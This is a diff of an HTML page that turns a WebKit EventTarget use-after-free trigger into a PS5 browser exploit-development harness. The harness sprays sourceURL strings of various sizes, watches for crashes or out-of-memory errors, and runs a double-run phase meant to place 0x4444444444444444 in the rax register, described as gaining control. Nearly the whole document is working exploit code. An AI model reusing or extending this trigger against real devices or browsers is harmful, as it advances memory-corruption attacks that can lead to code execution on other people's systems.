@@ -1,37 +1,156 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>PS5 v52 - EventTarget UAF Size Search</title>
+<style>
+body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
+pre { white-space: pre-wrap; word-wrap: break-word; }
+.ok { color: #00ff41 } .er { color: #ff3333 } .wr { color: #ffcc00 } .hl { color: #00ffff }
+</style>
+</head>
 <body>
-<p>Use-after-free in Webkit EventTarget.</p>
-<button onclick="main()">Click to trigger the bug</button>
-
+<pre id="out"></pre>
 <script>
-function main() {
-    const f = document.body.appendChild(document.createElement('iframe'));
+var out = document.getElementById("out");
+function log(m,c){var s=document.createElement("span");if(c)s.className=c;s.textContent=m+"\n";out.appendChild(s);out.scrollTop=out.scrollHeight}
 
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
+log("=== EventTarget UAF Size Search ===\n");
+log("Testing spray sizes to find crash/OOM boundary...\n");
 
+var sizes = [
+  {mb: 4,  bytes: 4 * 1024 * 1024},
+  {mb: 8,  bytes: 8 * 1024 * 1024},
+  {mb: 12, bytes: 12 * 1024 * 1024},
+  {mb: 16, bytes: 16 * 1024 * 1024},
+  {mb: 24, bytes: 24 * 1024 * 1024},
+  {mb: 32, bytes: 32 * 1024 * 1024},
+];
+
+var currentSize = 0;
+var runCount = 0;
+
+function trySize() {
+  if (currentSize >= sizes.length) {
+    log("\n=== SEARCH COMPLETE ===","hl");
+    log("If no crash at any size, the UAF may need a different approach.","wr");
+    return;
+  }
+  
+  var size = sizes[currentSize];
+  runCount++;
+  
+  log("[*] Testing " + size.mb + "MB (run " + runCount + ")...");
+  
+  try {
+    // Create iframe
+    var f = document.body.appendChild(document.createElement('iframe'));
+    
+    // Create DOM structure
+    var a = document.createElement('div');
+    var b = a.appendChild(document.createElement('div'));
+    
+    // Register event listeners
     a.addEventListener('a', eval(`(function () {
-        document.adoptNode(a);
-        f.remove();
-
-        throw {
-            line: 1,
-            column: 1,
-            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
-        };
+      document.adoptNode(a);
+      f.remove();
+      throw {
+        line: 1,
+        column: 1,
+        sourceURL: 'C'.repeat(` + size.bytes + `)
+      };
     })`));
-
-    a.addEventListener('a', () => {});
-
-    b.addEventListener('a', () => {
+    
+    a.addEventListener('a', function() {});
+    
+    b.addEventListener('a', function() {
+      try {
         f.contentDocument.adoptNode(a);
+      } catch(e) {}
     });
-
+    
+    // Dispatch event
     b.dispatchEvent(new Event('a', { bubbles: true }));
+    
+    log("  [+] No crash at " + size.mb + "MB","ok");
+    
+    // Clean up
+    try { if (f.parentNode) f.remove(); } catch(e) {}
+    try { if (a.parentNode) a.remove(); } catch(e) {}
+    
+    currentSize++;
+    setTimeout(trySize, 500);
+    
+  } catch(e) {
+    var msg = e.message;
+    
+    if (msg.indexOf("memory") !== -1 || msg.indexOf("Memory") !== -1 || msg.indexOf("allocation") !== -1) {
+      log("  [!] OOM at " + size.mb + "MB: " + msg,"er");
+      log("  → Try smaller size","wr");
+      currentSize++;
+      setTimeout(trySize, 1000);
+    } else {
+      log("  [!] Exception at " + size.mb + "MB: " + msg,"er");
+      log("  → This might be the UAF!","hl");
+      currentSize++;
+      setTimeout(trySize, 1000);
+    }
+  }
 }
 
-</script>
+// Also try running the UAF TWICE at each size
+// (researcher said "second run should return A in rax")
+function tryDoubleRun() {
+  log("\n[*] Trying double-run at 8MB...","hl");
+  
+  for (var round = 0; round < 2; round++) {
+    log("  Round " + (round + 1) + "...");
+    try {
+      var f = document.body.appendChild(document.createElement('iframe'));
+      var a = document.createElement('div');
+      var b = a.appendChild(document.createElement('div'));
+      
+      a.addEventListener('a', eval(`(function () {
+        document.adoptNode(a);
+        f.remove();
+        throw {
+          line: 1,
+          column: 1,
+          sourceURL: 'D'.repeat(` + (8 * 1024 * 1024) + `)
+        };
+      })`));
+      
+      a.addEventListener('a', function() {});
+      b.addEventListener('a', function() {
+        try { f.contentDocument.adoptNode(a); } catch(e) {}
+      });
+      
+      b.dispatchEvent(new Event('a', { bubbles: true }));
+      log("  [+] Round " + (round + 1) + " completed","ok");
+      
+      try { if (f.parentNode) f.remove(); } catch(e) {}
+      try { if (a.parentNode) a.remove(); } catch(e) {}
+    } catch(e) {
+      log("  [!] Round " + (round + 1) + " error: " + e.message,"er");
+    }
+  }
+  
+  log("\n=== DOUBLE RUN COMPLETE ===","hl");
+  log("If PS5 crashed during round 2, the UAF is confirmed!","hl");
+  log("Check crash report for 'rax' value.","hl");
+  log("If rax contains 0x4444444444444444, we have control!","hl");
+}
 
+// Start with single runs
+log("Phase 1: Single run at each size\n");
+trySize();
+
+// After single runs, try double run at 8MB
+setTimeout(function() {
+  log("\nPhase 2: Double run at 8MB\n");
+  tryDoubleRun();
+}, 10000);
+
+</script>
 </body>
-</html> 
+</html>
